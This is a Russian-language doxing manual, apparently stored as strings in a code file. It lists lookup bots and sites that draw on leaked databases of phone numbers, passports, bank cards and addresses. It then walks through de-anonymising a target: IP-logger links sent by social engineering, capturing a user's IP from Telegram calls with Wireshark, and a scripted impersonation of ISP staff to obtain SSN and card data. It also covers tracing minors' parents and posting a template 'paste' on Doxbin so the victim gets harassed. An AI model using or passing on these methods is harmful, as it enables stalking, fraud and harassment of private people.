@StealDetectorBOT-покажет часть утекшего пароля\n @SovaAppBot-найдет аккаунты с похожим ником среди 500+ сайтов\n Maigret (t) — найдет аккаунты с таким же ником среди 2000+ сайтов\nnamecheckup.com — найдет искомый ник на сайтах\ninstantusername.com — найдет искомый ник на сайтах\n suip.biz — найдет искомый ник на 300+ сайтах, работает очень медленно, дождитесь ответа\n namechk.com — найдет искомый ник на сайтах и в доменах\n sherlock (t) — найдет искомый ник на сайтах\nwhatsmyname.app — найдет искомый ник на сайтах\n boardreader.com — найдет искомый ник на форумах\n leakedsource.ru — найдет искомый ник на сайтах\n yasni.com — автоматический поиск в интернете\n social-searcher.com — найдет упоминания в соц. сетях и на сайтах\n socialmention.com — найдет упоминания ника\n\n Поиск по Номеру Телефона:\n@Quick_OSINT_bot — найдет оператора, email, как владелец записан в контактах, базах данных и досках объявлений, аккаунты в соц. сетях и мессенджерах, в каких чатах состоит, документы, адреса и многое другое\n @clerkinfobot — бот берет данные из приложения getcontact, показывает как записан номер телефона в контактах\n @dosie_Bot — как и в боте uabaza дает информацио о паспорте только польностью, 3 бесплатные попытки\n @find_caller_bot — найдет ФИО владельца номера телефона\n@get_caller_bot — поиск по утечкам персональных данных и записным книгам абонентов, может найти ФИО, дату рождения, e-mail\n@get_kolesa_bot — найдет объявления на колеса.кз\n @get_kontakt_bot — найдет как записан номер в контактах, дает результаты что и getcontact\n@getbank_bot — дает номер карты и полное ФИО клиента банка\n@GetFb_bot — бот находит Facebook\n @Getphonetestbot — бот берет данные из приложения getcontact, показывает как записан номер телефона в контактах\n@info_baza_bot — поиск в базе данных\n@mailsearchbot — найдет часть пароля\n@MyGenisBot — найдет имя и фамилию владельца номера\n @phone_avito_bot — найдет аккаунт на Авито\n @usersbox_bot — бот найдет аккаунты в ВК у которых в поле номера телефона указан искомый номер\n avinfo.guru — проверка телефона владельца авто, иногда нужен VPN\n fa-fa.kz — найдет ФИО, проверка наличия задолженностей, ИП, и ограничения на выезд\n getcontact.com — найдет информацию о том как записан номер в контактах\n globfone.com — бесплатные анонимные звонки на любой номер телефона\n mirror.bullshit.agency — поиск объявлений по номеру телефона\n mysmsbox.ru — определяет чей номер, поиск в Instagram, VK, OK, FB, Twitter, поиск объявлений на Авито, Юла, Из рук в руки, а так же найдет аккаунты в мессенджерах\n nuga.app — найдет Instagram аккаунт, авторизация через Google аккаунт и всего 1 попытка\n numberway.com — найдет телефонный справочник\n personlookup.com.au — найдет имя и адрес\n phoneInfoga.crvx.fr — определят тип номера, дает дорки для номера, определяет город\n spravnik.com — поиск по городскому номеру телефона, найдет ФИО и адрес\n spravochnik109.link — поиск по городскому номеру телефона, найдет ФИО и адрес\n teatmik.ee — поиск в базе организаций, ищет номер в контактах\n truecaller.com — телефонная книга, найдет имя и оператора телефона\n boardreader.com — поисковик по форумам, ищет и по нику\n dumpedlqezarfife.onion — найдет почту с паролем\n instantusername.com — проверка по сайтам и приложениям\n\nПоиск по Email:\n@Quick_OSINT_bot — найдет телефон, как владелец записан в контактах, базах данных и досках объявлений, аккаунты в соц. сетях и мессенджерах, в каких чатах состоит, документы, адреса и многое другое\n @info_baza_bot — покажет из какой базы слита почта, 2 бесплатных скана\n @last4mailbot — бот найдет последние 4 цифры номера телефона клиента Сбербанка\n@mailsearchbot — ищет по базе, дает часть пароля\n @StealDetectorBOT — найдет утекшие пароли\n @GetGmail_bot — бот найдет адрес почты Gmail к которой привязан искомый email, 2 бесплатных результата и бесконечное число попыток\n cyberbackgroundchecks.com — найдет все данные гражданина США, вход на сайт разрешен только с IP адреса США\ndehashed.com — проверка почты в слитых базах\n ghostproject.fr — проверка почты в слитых база\n emailrep.io — найдет на каких сайтах был зарегистрирован аккаунт использующий определенную почту\nemailsherlock.com — автоматический поиск, найдет к каким сайтам привязан адрес почты\n haveibeenpwned.com — проверка почты в слитых базах\n intelx.io — многофункциональный поисковик, поиск осуществляется еще и по даркнету\n leakedsource.ru — покажет в каких базах слита почта\neakprobe.net — найдет ник и источник слитой базы \n mostwantedhf.info — найдет аккаунт skype\n pwndb2am4tzkvold.onion — поиск по базе hwndb, реализован поиск по паролю\n pipl.com — поиск людей, адресов, телефонов по почте и др.\n recon.secapps.com — автоматический поиск и создание карт взаимосвязей\n reversegenie.com — найдет местоположение, Первую букву имени и номера телефонов\n scylla.sh — поисковик по базам утечек, найдет пароли, IP, ники и многое другое, в поле поиска введите email: и после e-mail адрес, например email:mail@email.com\n searchmy.bio — найдет учетную запись Instagram с электронной почтой в описании\n spiderfoot.net — автоматический поиск с использованием огромного количества методов, можно использовать в облаке если пройти регистрацию\n\n Поисковики одно из самых важных, что есть в OSINT.\n Not Evil — Ищет там, куда Google, «Яндексу» и\n другим поисковикам вход закрыт в принципе.\n Yacy|https://yacy.net — децентрализованная поисковая система\n работающая по принципу сетей P2P\n Searchcode|https://searchcode.com/ — поиск по коду в открытых репозиториях\n Publicwww|https://publicwww.com/ — поиск по исходному коду страниц, можно искать\n ники, почты, трекеры, кошельки, адреса сайтов и т.д.\n Kribrum|https://kribrum.io/ — поиск по социальным сетям\n Occrp|https://aleph.occrp.org/ — поиск по базам данных, файлам, реестрам компаний и т.д.\n Boardreader|http://boardreader.com/ — поисковик по форумам\n Wolfram  Alpha |https://www.wolframalpha.com/ — вычислительно-поисковая система\nSecapps|https://hss3uro2hsxfogfq.onion.to/ — автоматический поиск и создание карт взаимосвязей\nClearnet:\nshodan.io\n lampyre.io\n pipl.com\n Haystack \n DDG \n VisiTOR \n OnionLand \n Phobos \n Tor66 \n Dark Search\n Google Onion \n ExcavaTOR \n Ahima \n Gdark\n Sentor\nAbiko \n TOR Search  \n Submarine \n Search demon \n HD Wiki \n Torch\n Onion Search\n Dark video \n Avax\n Underdir \n OLD \n Deep web links \n Dark Eye \n The Hidden Wiki  \n Uncensored Hidden Wiki\n Onion Links \n LDO \n Tor wiki\n Raddle \n Dread\n\n Определяем геолокацию по почте:\n\nДля того, чтобы узнать местоположение интересующего вас человека, зная только адрес его почты, уже давно существует множество утилит, инструментов и программ.\n Сегодня же мы решили обратить ваше внимание на инструмент GetNotify. Он является абсолютно бесплатным, но весьма эффективным инструментом для отслеживания местоположения человека с помощью электронной почты.\n Сам по себе сервис работает на основании принципа добавления невидимого изображения (т.е трекера) в исходящие письмо, поскольку гугл разрешает редактировать исходных ход любого отправляемого письма.\n Таким образом, после открытия письма, скрытое изображение загружается с сервера GetNotify и выдает вам IP адрес жертвы.\n\n https://www.getnotify.com/\n\n Лучшие OSINT инструменты\n Если какой-то сервис не работает зайдите с Tor Browser\n\n Сервисы:\nhttps://gofindwho.com - Поиск по Соц Сетям, Ф.И, Нику, Email, Номер телефона.Очень хороший сервис СОВЕТУЮ\n fssp.online - поиск задолженности по СНИЛС, ИНН, СТС, номеру ИП, ВУ и паспорта, поиск бесплатный\n mmnt.ru - найдет упоминания в документах\n rfpoisk.ru - базы данных городов связка И.Ф+ГОРОД+СТРАНА\nTelefon Stop-list - поиск номера и по всем другим ресурсам.\n http://telkniga.com - вбиваем ФИО для получения адреса прописки \nhttps://bases-brothers.ru/ - поиск номера в объявлениях\n https://mirror.bullshit.agency/ - поиск объявлений по номеру телефона\n https://www.infobel.com/fr/world -  найдет номер телефона, адрес и ФИО\n teatmik.ee - поиск в базе организаций, ищет номер в контактах\n pimeyes.com/en/ - Поиск по Лицу\n mysmsbox.ru - определяет чей номер, поиск в Instagram, VK, OK, FB, Twitter, поиск объявлений на Авито, Юла, Из рук в руки, а так же найдет аккаунты в мессенджерах\n personlookup.com.au - найдет имя и адрес\n https://rusfinder.pro/vk/user/id12345 - Сохранёная Информация об аккаунте вместо 12345 вставьте айди человека\n https://ruprofile.pro/vk_user/id12345 - Сохранёная Информация об аккаунте вместо 12345 вставьте айди человека\n\n Телеграм Боты:\n @UniversalSearchBot - Поиск по Telegram, Vk, Номеру Телефону, Email.Это не копия Глаза Бога.Даёт бесплатно 7 попыток пробива.\n @TgAnalyst_bot - находит номер телефона, старое имя аккаунта, логин, IP адрес и устройство.Поиск только по Telegram ID, который состоит из цифр. Узнать ID можно в @userinfobot или @CheckID_AIDbot \n @pimeyesbot - найдет фото лица в Интернете и даст прямую ссылку на фото\n @vkfindface_bot - найдет аккаунт в VK, поиск не точный\n @SEARCHUA_bot - 1 раз бесплатно выдает досье на гражданина Украины где есть паспорт, адрес проживания, ФИО, автомобили, родственники, email, номера телефонов и много другого\n @GetDomruBot - находит часть адреса, email и весь номер лицевого счета клиента Domru по номеру телефона\n @SangMataInfo_bot - история изменения имени аккаунта\n @eyeofbeholder_bot - бот подсказывает интересы человека по его аккаунту Telegram, дает бонус каждому новому пользователю, который можно потратить на 1 поиск\n @last4mailbot - бот найдет последние 4 цифры номера телефона клиента Сбербанка\n @find_caller_bot - найдет номер телефона По Ф.И.О\n @HimeraSearch_bot - даст адреса и телефоны, ИНН и СНИЛС, инфо о недвижимости и транспортных средствах, контакты родственников и друзей, места работы и многое другое.\n @MyGenisBot — найдет имя и фамилию владельца номера\n\n Думаю, это много кого заинтересует, так как по профилю Вк можно узнать о человеке многое. \nЕго фотографии, записи и список друзей могут дать нам крайне много полезной информации.\nОднако стоит отметить, что следующий способ работает только в том случае, если номер привязан к странице.\n Добавляем номер телефона, который мы хотим пробить в контакты нашего смартфона.\n Следом, открываем приложение "Вконтакте" и переходим на свою страницу.\n Открываем список друзей\n После этого вас предупредят, что все номера вашего справочника будут использованы и отправлены на сервер для поиска.\n Думаю, понятно, что для этих действий лучше использовать не свой основной телефон, дабы не пропалить все свои контакты.\nПосле того, как Вы нажмете «да» вы получите список аккаунтов людей (тех что были в ваших контактах), среди которых есть наша цель.\n\nМануал был написан Слайзом ( Slize Redwise - @slizegod )\n\n\n',
            "Докс (manual by slizegod lvl 3)": 'Я хотел бы поблагодарить вас за то, что вы выбрали мой мануал для прочтения. Я научу вас буквально всему, что вам нужно\nзнать о докcинге. Я Слайз ( Slize Redwise) связь со мной - @slizegod\n \nПервым делом вам нужно понять что произвести деанонимизацию возможно на любого члена общества, если человек позаботился о своей анонимности и замел следы который он оставил ранее,\nто вы можете попытаться найти ошибку из за которой он находиться под угрозой, ведь каждый человек допускает ошибки - это нормально. Порой из за таких ошибок грубо говоря человек покидает интернет.\nЧто бы не быть под угрозой в интернет обществе, вам следует очистить все следы вплоть до удаления страниц< смены номеров и отдельный девайс для \'работы\' \n\n Что такое Doxing?\n \nDoxing - – это раскрытие частной информации о человеке без его ведома или согласия. Это может включать адрес, работу, номер телефона, фотографии и многое другое. Социальные сети упростили доксинг и разрушили любую концепцию анонимности. Которая, как можно было бы подумать, существует. Сразу хочу вам сообщить о том что если вы деанонимизируете киберпреступников будь это доксер или лжеминер и сдаете данные в полицию то \nвам соответственно ничего не будет, так же если вы используете навыки доксинга с целью отпугнуть вашего обидчика будь это тролль или кто-то другой то это тоже караться законом не будет. Доксинг карается законом в том случае если же вы найденную информацию постите на всеми известный Doxbin. Ну мы же тут собрались не по закону действовать, верно?) Постить так называемые \'пасты\' ( паста - в доксинге означает информация собранная в специальный шаблон ) можно не только в Doxbin, но еще и в другие источники которые я оставлю в конце мануала.\n\n Как же совершить успешный Dox?\n\n\nДля успешного доксинга необходимо иметь время, но не всегда. Успешный доксинг может зависить не от времени но еще и от навыков, как раз таки про навыки я вам сегодня и расскажу. Максимум навыком понадобиться в том случае если же жертва имеет базовую анонимность, для успешного доксинга вам нужно анализировать каждую новую полученнную информацию о жертвве и доставать с нее новую и новую. Ведь доксинг - цепь. Почему? А потому что доксинг заключается в сборе информации с одной зацепки другую а с другой уже следущую.\n\n #1 -  Добывание  IP обидчика\n\nСамый простой способ - Айпи логгер - всеми известный способ достать айпи обидчика, но многие не догадываются что благодаря айпи можно узнать очень много инфомарции.\nДля того что бы узнать айпи обидчика самый легкий способ посадить его на ссылку соц-инженерией которую вы сделали на сайте и сократили.\nСсылка для создания айпи логгера - https://iplogger.org\nСсылка для сокращения ссылки айпи логгера - https://kurl.ru/\n\nСложный способ достования айпи адресса обидчика это инструмент wireshark\nСсылка на скачку - https://www.wireshark.org/download.html\nПодробное использование и установку вы можете глянуть на ютубе.\nСкачиваем Wireshark, открываем его и в фильтре обязательно указываем нужный нам протокол - STUN.\nнажимаем на "лупу" (найти пакет) и видим, как у нас появится новая строка с параметрами и поисковой строкой. Там выбираем параметр строка.\nВ строке пишем XDR-MAPPED-ADDRESS.\nвключаем Wireshark и звоним через Telegram. Как только пользователь ответит на звонок, тут же у нас начнут отображаться данные и среди них будет IP адрес юзера, которому звонили.\nчтобы понять, какой именно IP нам нужен, жмём уже в настроенном поисковике Найти, ищем в строке XDR-MAPPED-ADDRESS а то, что идёт после него и есть нужный нам IP\nПосле получения айпи обидчика мы идем его использовать в разных целях\n\n #2 - Использование IP обидчика \n\nIp адрес жертвы - очень важный момент в доксинге если нету основных зацепок, благодаря айпи адресу можно узнать много информации благодаря которой вы сократите себе поиски в значительном размере\nПрикреплю пару сайтов для добычи информации \nhttps://www.shodan.io/ \nhttps://whatismyipaddress.com/ip-lookup\nhttps://ipinfo.io/tools/map\nhttps://www.iptrackeronline.com/\nПрогнав айпи адресс жертвы по этим сайтам будет уже весомая информация по которой можно двигаться дальше.\n\n#3 - Isp doxnig\n\nПроверка подлинности у интернет-провайдера. Здесь вы начинаете узнавать, как найти действительно личную информацию\nо цели, просто используя ее IP-адрес. Используйте их IP-адрес, чтобы связаться с их провайдером\n и найти номер провайдера. Я приведу список\nинструментов в нижней части этого раздела. Это общедоступные инструменты, поскольку doxing ISP является общедоступным. Интернет-провайдер\ndoxing может предоставить вам множество информации о цели, начиная от их имени и\nадреса и заканчивая данными их кредитной карты и SSN в файле. Это смертельно опасная тактика, и\nлучше всего, если вы используете интернет-провайдера, которого трудно найти, если же вы хотите избежать воздействия со стороны интернет-провайдера.\nСовет: Как вам избежать проверки интернет-провайдером? Скрывайте свой IP любой ценой. Вот как вы\nизбегаете доксинга от интернет-провайдера.\nСовет X2: Вот пример того, как выглядит доксинг от интернет-провайдера.\nСотрудник интернет-провайдера: Здравствуйте, чем мы можем вам помочь? Это Сара.\nВы: Привет, Сара, это Том, вообще-то я сам работаю на этого интернет-провайдера, и мне было\nинтересно, не могли бы вы поискать клиента в одном из наших инструментов для меня. Мой инструмент\nсильно глючит, и по какой-то причине у меня не работает Интернет. Мне много не нужно\n, клиент связался со мной через чат поддержки, и мне нужен номер, чтобы перезвонить ему\n, и имя. Остальное я могу посмотреть в одном из наших инструментов.\nСотрудник интернет-провайдера: Жаль это слышать. Позвольте мне просто посмотреть IP-адрес в нашем главном\nинструменте. Минутку, пожалуйста.\n*Несколько минут спустя*\nХорошо, вот номер телефона клиента, связанный с IP-адресом, и его\nполное имя. Это все?\nВы: Да, мэм. Спасибо, Сара. Удачной смены.\nОбычно этого достаточно. Подключение к интернет-провайдеру может быть либо действительно простым (интернет-провайдер\nподключился к Comcast IP несколько недель назад, получил последние четыре SSN), либо действительно сложным\n(несколько дней назад не удалось подключиться к TWC-провайдеру, потребовалось около четырех попыток). Лучше всего, если у вас\nдостаточно глубокий голос и звучание\nОбычно это все, что требуется. Подключение к интернет-провайдеру может быть либо действительно простым (интернет-провайдер\nподключился к Comcast IP несколько недель назад, получил последние четыре SSN), либо действительно сложным\n(несколько дней назад не удалось подключиться к TWC-провайдеру, потребовалось около четырех попыток). Лучше всего, если у вас\nдостаточно глубокий голос и вы будете звучать правдоподобно (больше коучинга для женщин). Все, что\nтребуется, - это практика и правильное знание инструментов, чтобы получить некоторую живую поддержку.\nСовет X3: Если вы потерпите неудачу с одним человеком, не переживайте по этому поводу. Просто подождите несколько минут или часов\nи попробуйте обратиться к другому сотруднику службы поддержки. Некоторых интернет-провайдеров действительно трудно найти, в то время\nкак некоторые безумно просты.\nСовет X4: Вот список инструментов интернет-провайдера. Да, это инструменты, к которым у вас может быть доступ\n, потому что сам по себе ISP doxing является общедоступным, и я сомневаюсь, что вы о нем не слышали\n. В любом случае, это необходимые инструменты и информация для тех случаев, когда вы\nобщаетесь с кем-то через интернет-провайдера. Они значительно упрощают работу интернет-провайдера.\nThey make ISP doxing a lot easier.\n\nAT&T - http://www.att.com/\nU-verse Support: 1-800-288-2020\nEmployee IDs - md905c\n• Systems: G2, CCTP, SystemX, Clarify, Telegence, MyCSP, Phoenix,\nTorch, CSR Admin, CTI, Agent Verification System, CCC Tool, DLC, C-Care\nSky - http://www.sky.com/\nSky Tech Support: 0-844-241-1653\n• Systems: Cloud\nCox - http://ww2.cox.com/residential/home.cox\nCox Support: 877-891-2899\n• Systems: Polaris (IP), iNav, edgehealth, Icon, IDM, ICOMS, SL2\nCharter - https://www.charter.com/\nCharter Support: 713-554-3669\n• Systems: Sigma (Ask for this for lookup), IRIS\nComcast - http://www.comcast.com/\nComcast Support: 1-800-934-6489\n• Systems: ACSR, Comtrac, CSG, Einstein, Grand-slam (Ask for this for\nlookups), Vision\nTime Warner - http://www.timewarnercable.com/\nTime Warner Support - 212-364-8300\n• Systems: Real, Unify (Ask for this for lookups)\nRoad Runner - http://www.rr.com/\nRoad Runner Support: 1-866-744-1678\n• Systems: Real, Unify\nVerizon - http://www.verizonwireless.com/\nVerizon Support: 1-800-837-4966\n• Systems: Coffee\nItems that are capable for look up:\nName on file:\nDOB on file:\nSSN on file:\nPhone on file:\nAddress on file:\nISP Account #:\nPrimary Account Email:\nCredit Card on File:\n\nВот что вы получаете в ответе интернет провайдера если все прошло успешно.\n\n#4 - Поиск по имени обидчика\n\nИспользование имени цели также очень полезно. Если у вас есть их имя, то вы, возможно, сможете узнать, где они живут, какой у них номер телефона, родственники и т.д. что\nдействительно могло бы быть полезно в доксе. Мы собираемся искать цели на официальных\nстраницах и других сайтах, поскольку многие люди не думают удалять свою информацию на\nБелые страницы или просто не знают как. Их невежество будет их ошибкой.\nПо имени можно достать много чего, зная город, если же город вам не известен то следуйте пунктам  1  и 2 что бы узнать город и что-то большее.\n\nПоиск Соц-сетей по имеющимся данным\nhttps://bigbookname.com/search#\nhttps://rocketreach.co/\nhttps://my.mail.ru/my/search_people\n\nНа самом деле поиск по имени и доставание верной информации - одно из времязатратных дел.\n\n\n#5 - Поиск по нику \n\nЯ рекомендую вам скопировать псевдоним жертв в поисковики, такие как http://www.pipl.com, чтобы найти их аккаунты/профили в социальных сетях. \nВы также можете получить их настоящие имена с этого сайта, я предпочитаю вручную искать профиль жертв в FACEBOOK, зайдя на http://facebook.com и выполнив поиск по настоящим именам жертв таким образом. \nПосле того, как у вас есть их профиль в FACEBOOK, вам следует перейти в раздел друзей, чтобы найти профиль их родителей в FACEBOOK, выполнив поиск фамилии (только в том случае, если жертве не исполнилось 18 лет). \nКак только вы найдете профиль родителей на FACEBOOK, вы сможете найти их имя  на http://www.whitepages.com, чтобы найти их номер телефона. Если у вас есть их полное имя, их деанонимизация может быть проще, но не на 100%, \nтак как многие люди могут иметь то же имя, что и ваша цель Вам следует получить IP-адрес вашей цели,что бы вы могли сделать поиск по городу, данный поиск получиться более точным. \n\nВторой способ это всеми известный глаз бога, введите туда ник жертвы произведите поиск  по миру и возможно вам выдаст номер телефона жертвы. Мы плавно подходим к поиску по номеру\n\n \n#6 - Поиск по номеру телефона \n\nПоиск по номеру телефона один из самых главных шагов в деанонимизации.\n\nПоиск регистраций по сайтам - https://epieos.com/\n\nТот же поиск по сайтам где был привязан номер но уже в виде тулса - https://github.com/megadose/ignorant/\n\nПоиск компаний - https://www.find-org.com/\n\nПоиск утечек - https://odyssey-search.info/\n\nДля быстрого поиска по браузера что бы найти где светился номер и на каких сайтах к примеру в вк, воспользуйтесь\nintext:7999999999 ( вместо цифр используйте номер обидчика) таким способом у вас есть шанс найти упоминания номера телефона\nна различных сайтах. К примеру возьмем ВК очень часто люди оставляют номер в комментариях либо же постах.\nAVinfoBot (r) – делает отчет где есть данные из социальных сетей, недвижимости,\nавтомобилей, объявлений и телефонных книжек. Нужно пригласить другой аккаунт для\nотчета\n\n getcontact.com (r) — выдает информацию о том как записан номер в контактах\n\n@OffThisContactBot — поиск в утечках, ищет как записан номер в контактах,\nбольшая база контактов, бесплатно подключите свой бот\n\ntruecaller.com (r) — телефонная книга, ищет имя и оператора телефона\n\navinfo.guru (r) — проверка телефона владельца авто, иногда нужен VPN\n\nspravnik.com — поиск по городскому номеру телефона, найдет ФИО и адрес\n\nm.ok.ru — показывает часть номера телефона, email, фамилии и полностью город с\nдатой регистрации, используй во вкладке инкогнито\n\nsmartsearchbot.com — бот находит ФИО, email, объявления, бесплатный поиск не\nдоступен для новых пользователей\n\n@phone_avito_bot — дает ссылку на аккаунт Авито с подробной информацией\nlist-org.com — найдет организацию в РФ\nместа работы, контакты, а при регистрации можно указать любую российскую\nорганизацию\n\nfind-org.com — найдет компанию в РФ\n\nSaveRuData — покажет, полный адрес, имя, все из сервиса Яндекс Еда, СДЕК,\nтраты на еду за 6 месяцев, иногда работает через VPN\n\nx-ray.to (r) — в утечек найдет имя, аккаунты, адреса, почту\n\n@probei_ru_bot — даст ФИО, email, адрес регистрации, другие номера телефонов\n\n@telegaphone_bot — найдет детали заказов в доставке еды, поиск в утечке\n\nресторанов 2-Берега и Вкусные Суши\n\nbbro.su — найдет имя аккаунта на Авито и его объявления\nприложения GetContact\n\n@Zernerda_bot — ищет в двухсот слитых базах, находит адреса, имена, аккаунты и\nмного другого, бесплатный поиск после первого запуска бота\n\n@declassified_bot — найдет почту, имена, адреса, авто\n\n@detectiva_bot — выдаст вккаунт ВК, ОК, адреса, почту, утечк\n\n\n#6 - Поиск по почте обидчика \n\nИспользование электронной почты цели - удивительная вещь при выполнении doxing. \nВыполнение поискас помощью электронной почты, честно говоря, упрощает выполнение doxing. Вы можете использовать адрес электронной почты цели для множества целей.\nПоиск Facebook -\nВы можете получить доступ к Facebook вашей цели по электронной почте. Это занимает несколько шагов и совсем не сложно.\n1. Перейдите на страницу Facebook.com\n2. Выберите опцию “Забыли свой пароль?”\n3. В поле в середине страницы укажите адрес электронной почты получателя.\n4. В нем должно быть указано имя цели, ее фотография, а иногда даже могут\nбыть указаны последние 4 цифры ее номера.\n5. Используйте имя, которое они вам только что дали, и / или фотографию и поместите их в dox. Мы\nвоспользуемся ими позже.\nСовет: Вы также можете использовать https://www.facebook.com/search.php?q = (электронная почта здесь), чтобы найти их Facebook.\nСовет X2: Это также может работать с номером телефона, следовательно, ввод номера телефона также является операцией\nКак говорилось раннее по фейсбуку можно найти много чего интернесного.\n\n#7  - Поиск по фото\nИногда использовать изображение при копировании может быть сложно, но это может дать хорошие результаты. \nЕсть два способа получить информацию из фотографий. Первый метод, который я объясню, заключается в использовании поисковой системы для поиска изображения в Интернете,\n а другой метод покажет вам, как получить exif-данные из изображения.\nПоиск по изображению\nЭто похоже на поиск в Google, но вместо этого используется изображение. Есть два сайта, которые могут это сделать. \nЯ перечислю их оба, но в своем объяснении я объясню, как использовать tineye. Они действительно эффективны и могут дать лучшие зацепки по целям. \nДопустим, у вас есть их фотография в Skype, и это та же самая фотография, которую они использовали на Facebook, как только вы выполните поиск по этой фотографии на одном из этих сайтов и найдете ее на их Facebook, \nвсе готово. У вас будет их название, которое может привести к тоннам информации.\nТеперь давайте перечислим сайты, которые мы можем использовать для этого.\nhttps://www.tineye.com / - “Проиндексировано 11,8 миллиардов изображений, и их число растет” https://images.google.com / - Это Google, черт возьми.\n\n\n#8 - Поиск по Telegram\n\nTelegago — найдет упоминание аккаунта в каналах, группах, включая приватные, а\nтак же в Telegraph статьях\nlyzem.com — найдет упоминание аккаунта в группах и каналах\n @usinfobot — по ID найдёт имя и ссылку аккаунта, работает в inline режиме, введите\nв поле ввода сообщения @usinfobot и Telegram ID\n cipher387.github.io — покажет архивированную страницу, даст 20+ прямых ссылок на\nсайты веб архивы, поиск по ссылке на аккаунт\n tgstat.com — поиск по публичным сообщениям в каналах, найдет упоминание\nаккаунта\n @SangMataInfo_bot — история изменения имени аккаунта\n@TeleSINT_Bot — найдет группы в которых состоит пользователь\n@creationdatebot — примерная дата создания аккаунта, бот принимает username,\nдля поиска по ID можно переслать сообщение от искомого пользователя\n@MySeekerBot — поисковик по иранским каналам\nTelegramOnlineSpy (t) — лог онлайн активности аккаунта, скажет когда был в сети\n Exgram — найдет упоминание аккаунта, это поисковая система на основе Яндекса,\nпоиск по 17 сайтам-агрегаторам, находит в Telegraph статьях, контактах, приватных и\nпубличных каналах с группами\n Commentgram — найдет упоминание аккаунта, поиск в комментариях к постам в\nTelegram, работает через Google\n Commentdex — найдет упоминание аккаунта, поиск в комментариях к постам в\nTelegram, работает через Яндекс\n @UniversalSearchRobot — по ID найдёт базовые адреса почты в сервисе Etlgr,\nстатус бана пользователя ботом ComBot, число блокировок, заблокированные\nсообщения и дату начала бана, архивное имя и аватар аккаунта\n smartsearchbot.com — бот находит ФИО, бесплатный поиск не доступен для новых\nпользователей\n @kruglyashik — канал с базой из 500K круглых видео-сообщений из русскоязычных\nгрупп, в поиске по каналу введите имя пользователя или #ID123456789 где 123456789\nID аккаунта\n @TgAnalyst_bot — находит номер телефона, старое имя аккаунта, логин, IP и\nустройство, местами могут быть ложные данные, первый поиск без регистрации, если\nеё пройти, то сливается ваш номер телефона\nглазбога.рф — найдет часть номера телефона, историю изменения ссылки\nаккаунта\n @clerkinfobot — дает номер телефона\nUsersBox.org — бот, по нику найдет номер телефона, бесплатный доступ 14 дней\nпосле первого запуска бота\n @TuriBot — выдает по ID имя пользователя аккаунта Telegram, отправь боту\nкоманду /resolve + ID\n @eyeofbeholder_bot — даёт интересы аккаунта, а платно выдаст историю\nизменения имени, номер телефона, группы и ссылки которые публиковал\nпользователь\n @regdatebot — выдаст примерную дату регистрации аккаунта, отправьте боту\nчисловой ID аккаунта или перешлите сообщение\n @QuickOSINT_Robot — найдет номер телефона, группы, id и ссылку аккаунта,\nпоиск по нику или ID аккаунта, всего 3 бесплатных запроса для новых аккаунтов\n @ki_wibot — найдет номер телефона в иранской утечке Telegram\n app.element.io (r) — найдет сохранённую копию аккаунта по ID, это аватарка и имя,\nпосле регистрации, нажми на +, и выбери "начать новый чат", введи id в поиск\n @OffThisContactBot — найдет номер телефона, почту, имя, для поиска создай и\nподключи свой тг-бот\n @Zernerda_bot — по ID находит телефон и ник аккаунта Telegram, бесплатный\nпоиск после первого запуска бота\n @declassified_bot — выдаст имена, телефон и почту\n @TeleScanOfficialBot — найдет группы в которых состоял пользователь, историю\nизменения имени, номер телефона\nПоиск через URL\n https://etlgr.me/conversations/123456789/subscription — найдет сохраненное имя\nаккаунта и статус подписки на @etlgr_bot, можно подставить к ID @etlgr.com и получить\nEmail адрес, замени 123456789 на ID аккаунта\nhttps://intelx.io/?s=https/t.me/USERNAME — найдет упоминание на сайтах и в слитых\nбазах, замените USERNAME на имя пользователя\nКак узнать по ID пользователя Telegram какие приватные группы он создал?\nБерем ID пользователя Telegram, например - 188610951\nПереводим тут из текста в 32 битный hex. Получается 0b 3d f9 87\n То что получилось тут переводим в base64, получается Cz35hw, где w надо убрать,\nт.е должно остаться первые 5 символов.\nСоставляем ссылку по которой будем искать.\nВсе приватные ссылки который создаст этот пользователь будут начинаться так:\nt.me/joinchat/Cz35h — Это не полная ссылка в приватную группу, а только её начало\nПоиск полной ссылки на группу\n Для DuckDuckGo и Yahoo\n"joinchat/Cz35h..." — вставьте в поиск эту фразу заменив Cz35h на то что у вас\nполучилось\n Для Yandex\ninurl:joinchat/Cz35h — вставьте в поиск эту фразу заменив Cz35h на то что у вас\nполучилось\n Для Google\n"joinchat/Cz35h" — вставьте в поиск эту фразу заменив Cz35h на то что у вас\nполучилось\nЧерез URL\nhttps://web.archive.org/web/*/t.me/joinchat/Cz35h/* — найдет запись в интернет архиве,\nзамените Cz35h на то что у вас получилось\n https://web.archive.org/web/*/telegram.me/joinchat/Cz35h/* — найдет запись в интернет\nархиве, замените Cz35h на то что у вас получилось\n\n\n\n#9 - Куда выкладывать свои работы? \n\nВы можете разместить dox на нескольких сайтах, чтобы человек был доступен всем в\nИнтернете, кто ищет его информацию. Лучше всего указать свой телеграмм  в dox, прежде чем публиковать их. Публикация dox может вызвать у объекта массу стресса из-за того, что люди\nбудут преследовать его. Ниже есть раздел о размещении dox с указанием сайтов\n, где его можно разместить, чтобы другие могли увидеть его и использовать в своих интересах, например,\nдля продвижения своего dox или даже для преследования его. Вы помогаете другим получить dox объекта, они помогают вам преследовать его, беспроигрышная ситуация.\n\nhttps://pastebin.com/\nhttps://doxbin.com/\n\nПрежде чем выкладывать работу, старайтесь как можно красивее оформить пасту.\n====================\nDropped by\n====================\nReason for Dox:\n====================\n*Personal Information:\nFull Name:\nPhone Number:\nDOB:\nEmail:\nPicture:\nAlias:\n====================\n*Location Information\nAddress:\nArea Code:\nZip:\nCity:\nState:\nCountry:\nContinent:\n====================\n*IP Information:\nIP Address:\nISP:\nHostname:\nVPN:\n====================\n*Social Media Accounts:\nTwitter:\nFacebook:\nSteam:\nInstagram:\n====================\nDropped by\n====================\n\n\n#10 - Итог\n \nЕсли же вы не нашли информацию в одном боте/сайте то ищите в другом, каждый бот/сайт пополняет каждый день базы данных\nкак вариант вам зайти тупо через некоторое время и попробовать заново. Не стоит завышать себя перед другими ведь если вдруг вас найдут, будет уже не до завышений самооценки, а люди на которых вы выебывались, будут смеяться xD\n\nВсегда если же вы не можете найти информацию возьмите отдых а после же к вам на светлую голову придет мысль как можно найти, у меня так было не раз\n\nВсегда думайте наперед ибо если же вы будете смотреть только вниз вы не сможете предвидеть обстановку которая вас ждет.\n\n\nМануал был написан Слайзом ( Slize Redwise ) cвязь со мной - @slizegod\n\nХорошего вам времяпровождения!\n\n\n\n\n\n\n          ',
